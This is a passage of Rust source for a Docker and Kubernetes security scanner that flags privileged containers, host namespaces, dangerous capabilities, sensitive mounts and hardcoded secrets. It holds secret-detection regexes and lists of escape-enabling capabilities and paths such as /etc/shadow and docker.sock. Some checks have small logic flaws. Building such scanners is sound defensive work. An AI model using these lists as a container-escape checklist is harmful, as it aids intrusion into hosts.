//! Docker Security Scanner
//!
//! Detects Docker security issues including:
//! - Dockerfile misconfigurations (latest tags, root user, secrets, untrusted sources)
//! - Runtime container security (privileged mode, host namespaces, capabilities)
//! - Container escape vectors (cgroup, device mounting, socket exposure)
//! - Image analysis (base vulnerabilities, layers, size)

#![allow(dead_code)]

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use regex::Regex;
use std::fs;
use std::path::Path;
use walkdir::WalkDir;
use serde_yaml::Value as YamlValue;

/// Directories to exclude from Docker scanning
const EXCLUDED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "target",
    "dist",
    "build",
    "vendor",
    "__pycache__",
    ".venv",
    "venv",
    ".idea",
    ".vscode",
    "coverage",
    ".next",
    ".nuxt",
    "out",
    ".terraform",
];

/// Docker-related filenames to scan
const DOCKERFILES: &[&str] = &[
    "Dockerfile",
    "Dockerfile.prod",
    "Dockerfile.production",
    "Dockerfile.dev",
    "Dockerfile.development",
    "Dockerfile.test",
    "Dockerfile.staging",
    "Dockerfile.*",
];

const DOCKER_COMPOSE_FILES: &[&str] = &[
    "docker-compose.yml",
    "docker-compose.yaml",
    "docker-compose.override.yml",
    "docker-compose.override.yaml",
    "docker-compose.prod.yml",
    "docker-compose.prod.yaml",
    "docker-compose.dev.yml",
    "docker-compose.dev.yaml",
    "docker-compose.test.yml",
    "docker-compose.test.yaml",
];

const KUBERNETES_FILES: &[&str] = &[
    "deployment.yaml",
    "deployment.yml",
    "deployment.*.yaml",
    "deployment.*.yml",
    "pod.yaml",
    "pod.yml",
    "pod.*.yaml",
    "pod.*.yml",
    "statefulset.yaml",
    "statefulset.yml",
    "daemonset.yaml",
    "daemonset.yml",
];

/// Dangerous capabilities that can lead to container escape
const DANGEROUS_CAPABILITIES: &[&str] = &[
    // Full container escape capabilities
    "CAP_SYS_ADMIN",      // Complete container escape
    "CAP_SYS_MODULE",     // Load kernel modules
    "CAP_SYS_PTRACE",     // Trace processes, potential escape
    "CAP_SYS_RAWIO",      // Raw I/O operations
    "CAP_SYS_BOOT",       // Reboot system
    "CAP_SYS_TIME",       // Set system time
    "CAP_SYSLOG",         // Kernel logging
    "CAP_SYS_CHROOT",     // chroot escape
    "CAP_SYS_PACCT",      // Process accounting
    "CAP_SYS_NICE",       // Process priority
    "CAP_SYS_RESOURCE",   // Resource manipulation
    "CAP_SYS_TTY_CONFIG", // TTY configuration
    // Network-related dangerous caps
    "CAP_NET_ADMIN",      // Network configuration, potential escape
    "CAP_NET_RAW",        // Raw sockets
    "CAP_NET_BIND_SERVICE", // Bind privileged ports
    // Filesystem dangerous caps
    "CAP_LINUX_IMMUTABLE", // Immutable files
    "CAP_DAC_OVERRIDE",    // Override file permissions
    "CAP_DAC_READ_SEARCH", // Read any file
    "CAP_FOWNER",          // Override file ownership
    "CAP_FSETID",          // Set file capabilities
    "CAP_SETUID",          // Set user ID
    "CAP_SETGID",          // Set group ID
    "CAP_SETPCAP",         // Set process capabilities
    "CAP_CHOWN",           // Change file ownership
    "CAP_MKNOD",           // Create special files
    "CAP_LEASE",           // File leases
    // Device and block dangerous caps
    "CAP_BLOCK_SUSPEND",   // Block device suspend
    "CAP_IPC_LOCK",        // Lock memory
    "CAP_IPC_OWNER",       // IPC ownership
    "CAP_MAC_OVERRIDE",    // MAC override
    "CAP_MAC_ADMIN",       // MAC administration
    "CAP_WAKE_ALARM",      // Wake alarm
    // Container-specific
    "CAP_AUDIT_CONTROL",   // Audit subsystem
    "CAP_AUDIT_READ",      // Read audit logs
    "CAP_AUDIT_WRITE",     // Write audit logs
];

/// Sensitive paths that should not be mounted
const SENSITIVE_MOUNT_PATHS: &[(&str, VulnSeverity)] = &[
    // Host filesystem
    ("/", VulnSeverity::Critical),
    ("/host", VulnSeverity::Critical),
    ("/root", VulnSeverity::Critical),
    ("/home", VulnSeverity::High),
    ("/etc", VulnSeverity::Critical),
    ("/etc/passwd", VulnSeverity::Critical),
    ("/etc/shadow", VulnSeverity::Critical),
    ("/etc/sudoers", VulnSeverity::Critical),
    ("/var/run/docker.sock", VulnSeverity::Critical),
    ("/var/lib/docker", VulnSeverity::Critical),
    ("/docker.sock", VulnSeverity::Critical),
    // System directories
    ("/proc", VulnSeverity::High),
    ("/sys", VulnSeverity::High),
    ("/dev", VulnSeverity::High),
    ("/run", VulnSeverity::High),
    ("/var/run", VulnSeverity::High),
    ("/boot", VulnSeverity::High),
    ("/lib", VulnSeverity::High),
    ("/lib64", VulnSeverity::High),
    ("/usr", VulnSeverity::Medium),
    ("/opt", VulnSeverity::Medium),
    ("/var", VulnSeverity::Medium),
    // Kubernetes specific
    ("/var/log/kubelet", VulnSeverity::High),
    ("/etc/kubernetes", VulnSeverity::High),
    ("/var/lib/kubelet", VulnSeverity::High),
    ("/var/lib/kube-proxy", VulnSeverity::High),
    // Cloud metadata
    ("/proc/self/environ", VulnSeverity::Medium),
    ("/proc/self/cgroup", VulnSeverity::Medium),
    ("/proc/self/mounts", VulnSeverity::Medium),
];

/// Untrusted base images or registries
const UNTRUSTED_REGISTRIES: &[&str] = &[
    "docker.io/library/",
    "index.docker.io/library/",
];

/// Known vulnerable base images (latest tag issues)
const LATEST_TAG_IMAGES: &[&str] = &[
    "alpine:latest",
    "ubuntu:latest",
    "debian:latest",
    "centos:latest",
    "fedora:latest",
    "node:latest",
    "python:latest",
    "nginx:latest",
    "redis:latest",
    "postgres:latest",
    "mysql:latest",
    "mongodb:latest",
    "ruby:latest",
    "golang:latest",
    "openjdk:latest",
    "java:latest",
    "httpd:latest",
    "tomcat:latest",
    "jetty:latest",
];

/// Secret patterns in Dockerfiles
const DOCKER_SECRET_PATTERNS: &[(&str, &str)] = &[
    (r"(?i)ENV\s+[A-Z_]*SECRET[^\n]*=", "Environment variable with SECRET in name"),
    (r"(?i)ENV\s+[A-Z_]*PASSWORD[^\n]*=", "Environment variable with PASSWORD in name"),
    (r"(?i)ENV\s+[A-Z_]*API[_-]?KEY[^\n]*=", "Environment variable with API_KEY"),
    (r"(?i)ENV\s+[A-Z_]*TOKEN[^\n]*=", "Environment variable with TOKEN in name"),
    (r"(?i)ENV\s+[A-Z_]*CREDENTIALS[^\n]*=", "Environment variable with CREDENTIALS"),
    (r"(?i)ARG\s+[A-Z_]*SECRET[^\n]*=", "ARG with SECRET (may persist in image)"),
    (r"(?i)ARG\s+[A-Z_]*PASSWORD[^\n]*=", "ARG with PASSWORD (may persist in image)"),
    (r"(?i)ARG\s+[A-Z_]*API[_-]?KEY[^\n]*=", "ARG with API_KEY (may persist in image)"),
    (r#"\b[A-Za-z0-9+/]{32,}={0,2}"#, "Potential base64 encoded secret"),
    (r"(?i)AKIA[0-9A-Z]{16}", "AWS Access Key ID"),
    (r"(?i)ghp_[a-zA-Z0-9]{36}", "GitHub Personal Access Token"),
    (r"(?i)sk_live_[a-zA-Z0-9]{24,}", "Stripe Live Key"),
    (r"(?i)AIza[0-9A-Za-z\-_]{35}", "Google API Key"),
];

struct DockerfileAnalysis {
    uses_latest: bool,
    runs_as_root: bool,
    uses_add: bool,
    copies_from_urls: bool,
    has_secrets: Vec<String>,
    base_image: Option<String>,
    multi_stage_without_cleanup: bool,
    exposed_dangerous_ports: Vec<u16>,
    uses_curl_wget: bool,
    line_count: usize,
}

struct ComposeService {
    name: String,
    privileged: bool,
    pid_mode: Option<String>,
    network_mode: Option<String>,
    ipc_mode: Option<String>,
    user: Option<String>,
    cap_add: Vec<String>,
    cap_drop: Vec<String>,
    volumes: Vec<String>,
    devices: Vec<String>,
    security_opt: Vec<String>,
    read_only: bool,
}

pub struct DockerScanner {
    config: ScannerConfig,
}

impl DockerScanner {
    pub fn new(config: ScannerConfig) -> Self {
        Self { config }
    }

    pub async fn scan(&self, path: &Path) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Path(path.to_path_buf()));

        // Scan Dockerfiles
        report.merge(self.scan_dockerfiles(path)?);

        // Scan Docker Compose files
        report.merge(self.scan_docker_compose(path)?);

        // Scan Kubernetes manifests
        report.merge(self.scan_kubernetes_manifests(path)?);

        // Scan for Docker socket exposure
        if self.config.aggressive {
            report.merge(self.check_docker_socket_access(path)?);
        }

        Ok(report)
    }

    /// Scan all Dockerfiles in the project
    fn scan_dockerfiles(&self, path: &Path) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Path(path.to_path_buf()));

        let entries = WalkDir::new(path)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| !self.should_exclude(e.path()))
            .filter(|e| e.file_type().is_file())
            .filter(|e| {
                e.path()
                    .file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| {
                        DOCKERFILES.iter().any(|pattern| {
                            if pattern.ends_with('*') {
                                let prefix = pattern.trim_end_matches('*');
                                n.starts_with(prefix) && *n != *prefix
                            } else {
                                n == *pattern
                            }
                        })
                    })
                    .unwrap_or(false)
            });

        for entry in entries {
            let file_path = entry.path();
            let file_path_str = file_path.display().to_string();

            if let Ok(content) = fs::read_to_string(file_path) {
                let analysis = self.analyze_dockerfile(&content, &file_path_str);
                report.merge(self.report_dockerfile_findings(&analysis, &file_path_str));
            }
        }

        Ok(report)
    }

    /// Analyze a Dockerfile for security issues
    fn analyze_dockerfile(&self, content: &str, _file_path: &str) -> DockerfileAnalysis {
        let lines: Vec<&str> = content.lines().collect();

        let mut analysis = DockerfileAnalysis {
            uses_latest: false,
            runs_as_root: true, // Default to root unless USER specified
            uses_add: false,
            copies_from_urls: false,
            has_secrets: Vec::new(),
            base_image: None,
            multi_stage_without_cleanup: false,
            exposed_dangerous_ports: Vec::new(),
            uses_curl_wget: false,
            line_count: lines.len(),
        };

        let mut from_count = 0;
        let mut last_from_line = 0;

        for (i, line) in lines.iter().enumerate() {
            let trimmed = line.trim();
            let upper = trimmed.to_uppercase();

            // Check FROM instruction
            if upper.starts_with("FROM ") {
                from_count += 1;
                last_from_line = i;

                let from_value = trimmed[5..].trim();
                analysis.base_image = Some(from_value.to_string());

                // Check for latest tag
                if from_value.contains(":latest") || from_value.ends_with("alpine")
                    || from_value.ends_with("ubuntu") || from_value.ends_with("debian")
                {
                    analysis.uses_latest = true;
                }
            }

            // Check USER instruction
            if upper.starts_with("USER ") {
                let user = trimmed[5..].trim();
                if user != "root" && !user.starts_with("0") {
                    analysis.runs_as_root = false;
                }
            }

            // Check ADD instruction (should use COPY instead)
            if upper.starts_with("ADD ") {
                analysis.uses_add = true;

                // Check if ADD is used with URLs
                let add_value = trimmed[4..].trim();
                if add_value.starts_with("http://") || add_value.starts_with("https://") {
                    analysis.copies_from_urls = true;
                }
            }

            // Check COPY with URLs
            if upper.starts_with("COPY ") && (trimmed.contains("http://") || trimmed.contains("https://")) {
                analysis.copies_from_urls = true;
            }

            // Check EXPOSE for dangerous ports
            if upper.starts_with("EXPOSE ") {
                let ports: Vec<&str> = trimmed[7..]
                    .split_whitespace()
                    .collect();

                for port_str in ports {
                    if let Ok(port) = port_str.parse::<u16>() {
                        // Check for dangerous ports
                        if matches!(port, 22 | 2375 | 2376 | 3375 | 4243 | 2379 | 2380) {
                            analysis.exposed_dangerous_ports.push(port);
                        }
                    }
                }
            }

            // Check for curl/wget usage (could download malware)
            if upper.contains("RUN ") && (upper.contains("CURL") || upper.contains("WGET")) {
                analysis.uses_curl_wget = true;
            }

            // Check for secret patterns
            for (pattern, desc) in DOCKER_SECRET_PATTERNS {
                if let Ok(re) = Regex::new(pattern) {
                    if re.is_match(trimmed) {
                        analysis.has_secrets.push(desc.to_string());
                    }
                }
            }
        }

        // Check multi-stage build without cleanup
        if from_count > 1 {
            // Check if there's cleanup between stages
            let after_second_from: String = lines.iter().skip(last_from_line + 1).copied().collect::<Vec<_>>().join("\n");
            if !after_second_from.to_uppercase().contains("RM -RF")
                && !after_second_from.to_uppercase().contains("RM -f /")
            {
                analysis.multi_stage_without_cleanup = true;
            }
        }

        analysis
    }

    /// Report findings from Dockerfile analysis
    fn report_dockerfile_findings(&self, analysis: &DockerfileAnalysis, file_path: &str) -> ScanReport {
        let mut report = ScanReport::new(Target::Path(file_path.into()));

        // Critical: Using latest tag
        if analysis.uses_latest {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Dockerfile: Latest Tag Used".to_string(),
                description: format!(
                    "Base image uses 'latest' tag or no tag ({}). This leads to unpredictable builds and potential security vulnerabilities.",
                    analysis.base_image.as_deref().unwrap_or("unknown")
                ),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Use specific version tags (e.g., 'alpine:3.18.0') instead of 'latest'. \
                    Pin major and minor versions for stability. Update dependencies intentionally."
                        .to_string(),
                ),
                cwe: Some("CWE-494".to_string()),
                owasp: Some("A08:2021 - Software and Data Integrity Failures".to_string()),
            });
        }

        // High: Running as root
        if analysis.runs_as_root {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Dockerfile: Container Runs as Root".to_string(),
                description: "Container runs as root user. If an attacker compromises the container, \
                they have root privileges within it, which can be leveraged for container escape.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Add 'USER <non-root>' or 'USER nobody' in your Dockerfile. \
                    Create a non-root user earlier in the Dockerfile and use it for all subsequent operations."
                        .to_string(),
                ),
                cwe: Some("CWE-250".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Medium: Using ADD instead of COPY
        if analysis.uses_add {
            report.add_finding(Vuln {
                severity: VulnSeverity::Medium,
                title: "Dockerfile: ADD Instruction Used".to_string(),
                description: "ADD instruction is used. ADD can extract tar files and fetch from URLs, \
                which can lead to remote code execution if the source is compromised.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Use COPY instead of ADD for local files. Only use ADD when you specifically need \
                    tar extraction or URL fetching. For URLs, use RUN with curl/wget instead."
                        .to_string(),
                ),
                cwe: Some("CWE-494".to_string()),
                owasp: Some("A08:2021 - Software and Data Integrity Failures".to_string()),
            });
        }

        // High: Copying from URLs
        if analysis.copies_from_urls {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Dockerfile: Copying Files from URLs".to_string(),
                description: "ADD or COPY is used to fetch files from URLs. The content is not verified \
                before being added to the image, which could lead to supply chain attacks.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Download files using RUN with curl/wget, verify checksums, then use COPY. \
                    Always verify the integrity of files downloaded from external sources."
                        .to_string(),
                ),
                cwe: Some("CWE-494".to_string()),
                owasp: Some("A08:2021 - Software and Data Integrity Failures".to_string()),
            });
        }

        // Critical: Secrets in Dockerfile
        for secret in &analysis.has_secrets {
            report.add_finding(Vuln {
                severity: VulnSeverity::Critical,
                title: format!("Dockerfile: {}", secret),
                description: format!(
                    "Potential secret exposed in Dockerfile. Secrets in build instructions persist in the image layer history.",
                ),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Use build args (ARG) combined with runtime environment, or use Docker secrets. \
                    Never hardcode credentials in Dockerfiles. Use multi-stage builds to exclude secrets from final image."
                        .to_string(),
                ),
                cwe: Some("CWE-798".to_string()),
                owasp: Some("A07:2021 - Identification and Authentication Failures".to_string()),
            });
        }

        // Info: Multi-stage without cleanup
        if analysis.multi_stage_without_cleanup {
            report.add_finding(Vuln {
                severity: VulnSeverity::Low,
                title: "Dockerfile: Multi-stage Build Without Cleanup".to_string(),
                description: "Multi-stage build detected but no explicit cleanup between stages. \
                Build artifacts may remain in the final image.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Clean up build artifacts in the stage before the final FROM. \
                    Use '--no-cache' for builds, and combine RUN commands to reduce layers."
                        .to_string(),
                ),
                cwe: Some("CWE-1050".to_string()),
                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
            });
        }

        // High: Dangerous ports exposed
        for port in &analysis.exposed_dangerous_ports {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: format!("Dockerfile: Dangerous Port Exposed: {}", port),
                description: format!(
                    "Port {} is exposed. This port is commonly associated with sensitive services or Docker daemon.",
                    port
                ),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Only expose necessary application ports. \
                    Docker daemon ports (2375, 2376) should never be exposed. \
                    Use Docker networks for internal communication."
                        .to_string(),
                ),
                cwe: Some("CWE-215".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Medium: Using curl/wget without verification
        if analysis.uses_curl_wget {
            report.add_finding(Vuln {
                severity: VulnSeverity::Medium,
                title: "Dockerfile: Remote File Download Without Verification".to_string(),
                description: "RUN commands use curl or wget to download files. Without checksum verification, \
                the downloaded files could be tampered with.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Always verify downloaded files using checksums. \
                    Use 'curl -fsSL <url> | sha256sum -c <checksum>' or similar. \
                    Pin specific versions in URLs."
                        .to_string(),
                ),
                cwe: Some("CWE-494".to_string()),
                owasp: Some("A08:2021 - Software and Data Integrity Failures".to_string()),
            });
        }

        report
    }

    /// Scan Docker Compose files
    fn scan_docker_compose(&self, path: &Path) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Path(path.to_path_buf()));

        let entries = WalkDir::new(path)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| !self.should_exclude(e.path()))
            .filter(|e| e.file_type().is_file())
            .filter(|e| {
                e.path()
                    .file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| DOCKER_COMPOSE_FILES.contains(&n))
                    .unwrap_or(false)
            });

        for entry in entries {
            let file_path = entry.path();
            let file_path_str = file_path.display().to_string();

            if let Ok(content) = fs::read_to_string(file_path) {
                if let Ok(yaml_value) = serde_yaml::from_str::<YamlValue>(&content) {
                    report.merge(self.analyze_compose_yaml(&yaml_value, &file_path_str));
                }
            }
        }

        Ok(report)
    }

    /// Analyze Docker Compose YAML configuration
    fn analyze_compose_yaml(&self, yaml: &YamlValue, file_path: &str) -> ScanReport {
        let mut report = ScanReport::new(Target::Path(file_path.into()));

        // Get services section
        let services = if let Some(YamlValue::Mapping(map)) = yaml.get("services") {
            map
        } else {
            return report;
        };

        for (service_key, service_value) in services {
            let service_name = if let YamlValue::String(s) = service_key {
                s.clone()
            } else {
                service_key.as_str().unwrap_or("unknown").to_string()
            };

            // Check for privileged mode
            if service_value.get("privileged").and_then(|v| v.as_bool()).unwrap_or(false) {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Critical,
                    title: format!("Docker Compose: Privileged Mode - {}", service_name),
                    description: format!(
                        "Service '{}' is running with privileged mode. This gives the container \
                        full access to host devices and can lead to complete container escape.",
                        service_name
                    ),
                    location: Some(file_path.to_string()),
                    recommendation: Some(
                        "Remove 'privileged: true'. Instead, use specific capabilities with 'cap_add'. \
                        Only add the minimum capabilities required for the application."
                            .to_string(),
                    ),
                    cwe: Some("CWE-250".to_string()),
                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                });
            }

            // Check for host namespace sharing
            if let Some(YamlValue::String(mode)) = service_value.get("pid_mode") {
                if mode == "host" {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Critical,
                        title: format!("Docker Compose: Host PID Namespace - {}", service_name),
                        description: format!(
                            "Service '{}' uses host PID namespace. This allows viewing all processes \
                            on the host and can be used for process escape.",
                            service_name
                        ),
                        location: Some(file_path.to_string()),
                        recommendation: Some(
                            "Remove 'pid_mode: host'. Use the default isolated PID namespace. \
                            Only use host PID when absolutely necessary for process monitoring."
                                .to_string(),
                        ),
                        cwe: Some("CWE-250".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }

            if let Some(YamlValue::String(mode)) = service_value.get("network_mode") {
                if mode == "host" {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::High,
                        title: format!("Docker Compose: Host Network Namespace - {}", service_name),
                        description: format!(
                            "Service '{}' uses host network namespace. This bypasses network \
                            isolation and allows access to host network services.",
                            service_name
                        ),
                        location: Some(file_path.to_string()),
                        recommendation: Some(
                            "Remove 'network_mode: host'. Use Docker networks for service communication. \
                            Only use host networking when required for low-level network operations."
                                .to_string(),
                        ),
                        cwe: Some("CWE-250".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }

            if let Some(YamlValue::String(mode)) = service_value.get("ipc_mode") {
                if mode == "host" {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::High,
                        title: format!("Docker Compose: Host IPC Namespace - {}", service_name),
                        description: format!(
                            "Service '{}' uses host IPC namespace. This allows access to host \
                            IPC mechanisms and can lead to information disclosure.",
                            service_name
                        ),
                        location: Some(file_path.to_string()),
                        recommendation: Some(
                            "Remove 'ipc_mode: host'. Use the default isolated IPC namespace."
                                .to_string(),
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }

            // Check for dangerous capabilities
            if let Some(YamlValue::Sequence(caps)) = service_value.get("cap_add") {
                for cap in caps {
                    if let YamlValue::String(cap_str) = cap {
                        for dangerous in DANGEROUS_CAPABILITIES {
                            if cap_str.contains(dangerous.trim_start_matches("CAP_")) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: format!("Docker Compose: Dangerous Capability - {}: {}", service_name, cap_str),
                                    description: format!(
                                        "Service '{}' adds capability '{}'. This capability can be \
                                        exploited for container escape or privilege escalation.",
                                        service_name, cap_str
                                    ),
                                    location: Some(file_path.to_string()),
                                    recommendation: Some(
                                        format!("Remove '{}' from cap_add. Use drop-all-capabilities approach, \
                                        only adding what's absolutely necessary.", cap_str)
                                    ),
                                    cwe: Some("CWE-269".to_string()),
                                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                                });
                            }
                        }
                    }
                }
            }

            // Check for sensitive volume mounts
            if let Some(YamlValue::Sequence(volumes)) = service_value.get("volumes") {
                for volume in volumes {
                    if let YamlValue::String(vol_str) = volume {
                        for &(sensitive_path, severity) in SENSITIVE_MOUNT_PATHS {
                            if vol_str.contains(sensitive_path) {
                                report.add_finding(Vuln {
                                    severity,
                                    title: format!("Docker Compose: Sensitive Path Mount - {}: {}", service_name, sensitive_path),
                                    description: format!(
                                        "Service '{}' mounts '{}'. This can lead to host system \
                                        access, container escape, or sensitive data exposure.",
                                        service_name, sensitive_path
                                    ),
                                    location: Some(file_path.to_string()),
                                    recommendation: Some(
                                        format!("Remove the mount of '{}'. Only mount specific \
                                        directories needed by the application.", sensitive_path)
                                    ),
                                    cwe: Some("CWE-250".to_string()),
                                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                                });
                            }
                        }
                    }
                }
            }

            // Check for device mounting
            if let Some(YamlValue::Sequence(devices)) = service_value.get("devices") {
                for device in devices {
                    if let YamlValue::String(dev_str) = device {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: format!("Docker Compose: Device Mounted - {}: {}", service_name, dev_str),
                            description: format!(
                                "Service '{}' mounts device '{}'. Direct device access can lead \
                                to container escape or data theft.",
                                service_name, dev_str
                            ),
                            location: Some(file_path.to_string()),
                            recommendation: Some(
                                "Remove device mounts. Only mount specific devices when absolutely \
                                required for the application's functionality."
                                    .to_string(),
                            ),
                            cwe: Some("CWE-250".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                    }
                }
            }

            // Check for security options
            if let Some(YamlValue::Sequence(sec_opts)) = service_value.get("security_opt") {
                for opt in sec_opts {
                    if let YamlValue::String(opt_str) = opt {
                        if opt_str.contains("seccomp:unconfined") || opt_str.contains("apparmor:unconfined") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Docker Compose: Unconfined Security - {}: {}", service_name, opt_str),
                                description: format!(
                                    "Service '{}' uses '{}'. This disables important security \
                                    mechanisms and increases the impact of container escape.",
                                    service_name, opt_str
                                ),
                                location: Some(file_path.to_string()),
                                recommendation: Some(
                                    "Remove unconfined security options. Use custom seccomp/AppArmor \
                                    profiles that only allow necessary syscalls."
                                        .to_string(),
                                ),
                                cwe: Some("CWE-269".to_string()),
                                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                            });
                        }
                    }
                }
            }

            // Check if container is read-only
            if !service_value.get("read_only").and_then(|v| v.as_bool()).unwrap_or(false) {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Low,
                    title: format!("Docker Compose: Writable Filesystem - {}", service_name),
                    description: format!(
                        "Service '{}' has a writable filesystem. Read-only filesystems \
                        prevent malicious scripts from writing to disk.",
                        service_name
                    ),
                    location: Some(file_path.to_string()),
                    recommendation: Some(
                        "Set 'read_only: true' and use tmpfs for directories that need to be writable."
                            .to_string(),
                    ),
                    cwe: Some("CWE-732".to_string()),
                    owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                });
            }

            // Check for user configuration
            if service_value.get("user").is_none() || service_value.get("user") == Some(&YamlValue::Null) {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Medium,
                    title: format!("Docker Compose: Root User - {}", service_name),
                    description: format!(
                        "Service '{}' runs as root (no user specified). Default Docker behavior runs as root.",
                        service_name
                    ),
                    location: Some(file_path.to_string()),
                    recommendation: Some(
                        "Set 'user: <uid>:<gid>' or 'user: username' to run as non-root user."
                            .to_string(),
                    ),
                    cwe: Some("CWE-250".to_string()),
                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                });
            }
        }

        report
    }

    /// Scan Kubernetes manifests
    fn scan_kubernetes_manifests(&self, path: &Path) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Path(path.to_path_buf()));

        let entries = WalkDir::new(path)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| !self.should_exclude(e.path()))
            .filter(|e| e.file_type().is_file())
            .filter(|e| {
                e.path()
                    .file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| {
                        KUBERNETES_FILES.iter().any(|pattern| {
                            if pattern.contains('*') {
                                let parts: Vec<&str> = pattern.split('*').collect();
                                n.starts_with(parts[0])
                            } else {
                                n == *pattern
                            }
                        })
                    })
                    .unwrap_or(false)
            });

        for entry in entries {
            let file_path = entry.path();
            let file_path_str = file_path.display().to_string();

            if let Ok(content) = fs::read_to_string(file_path) {
                report.merge(self.analyze_kubernetes_manifest(&content, &file_path_str));
            }
        }

        Ok(report)
    }

    /// Analyze Kubernetes manifest
    fn analyze_kubernetes_manifest(&self, content: &str, file_path: &str) -> ScanReport {
        let mut report = ScanReport::new(Target::Path(file_path.into()));

        // Simple regex-based analysis for YAML content
        let upper_content = content.to_uppercase();

        // Check for privileged containers
        if upper_content.contains("PRIVILEGED: TRUE") {
            report.add_finding(Vuln {
                severity: VulnSeverity::Critical,
                title: "Kubernetes: Privileged Container".to_string(),
                description: "Container is running with privileged flag set to true. This provides \
                full access to host devices and can lead to complete container escape.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Remove 'privileged: true'. Use specific capabilities and drop all capabilities \
                    that are not required. Implement Pod Security Policies or OPA policies."
                        .to_string(),
                ),
                cwe: Some("CWE-250".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Check for hostPID
        if upper_content.contains("HOSTPID: TRUE") {
            report.add_finding(Vuln {
                severity: VulnSeverity::Critical,
                title: "Kubernetes: Host PID Namespace".to_string(),
                description: "Pod uses host PID namespace. This allows viewing all host processes and \
                can be exploited for container escape.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Remove 'hostPID: true'. Use the default isolated PID namespace."
                        .to_string(),
                ),
                cwe: Some("CWE-250".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Check for hostNetwork
        if upper_content.contains("HOSTNETWORK: TRUE") {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Kubernetes: Host Network Namespace".to_string(),
                description: "Pod uses host network namespace. This bypasses network isolation.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Remove 'hostNetwork: true'. Use Kubernetes network policies for communication control."
                        .to_string(),
                ),
                cwe: Some("CWE-250".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Check for hostIPC
        if upper_content.contains("HOSTIPC: TRUE") {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Kubernetes: Host IPC Namespace".to_string(),
                description: "Pod uses host IPC namespace. This allows access to host IPC mechanisms.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some("Remove 'hostIPC: true'. Use the default isolated IPC namespace.".to_string()),
                cwe: Some("CWE-200".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        // Check for dangerous capabilities in YAML
        for dangerous in DANGEROUS_CAPABILITIES {
            if upper_content.contains(&dangerous.replace("CAP_", "")) ||
               upper_content.contains(dangerous) {
                report.add_finding(Vuln {
                    severity: VulnSeverity::High,
                    title: format!("Kubernetes: Dangerous Capability - {}", dangerous),
                    description: format!("Container adds capability '{}'. This can lead to privilege escalation.", dangerous),
                    location: Some(file_path.to_string()),
                    recommendation: Some("Remove dangerous capabilities. Drop all capabilities and only add what's necessary.".to_string()),
                    cwe: Some("CWE-269".to_string()),
                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                });
            }
        }

        // Check for hostPath volume mounts
        if upper_content.contains("HOSTPATH") {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Kubernetes: HostPath Volume Mount".to_string(),
                description: "Pod uses hostPath volume mount. This allows mounting host filesystem paths into the container.".to_string(),
                location: Some(file_path.to_string()),
                recommendation: Some(
                    "Avoid hostPath volumes. Use PersistentVolumeClaim, ConfigMap, or Secret instead. \
                    If hostPath is required, use it with readOnly: true and specific paths."
                        .to_string(),
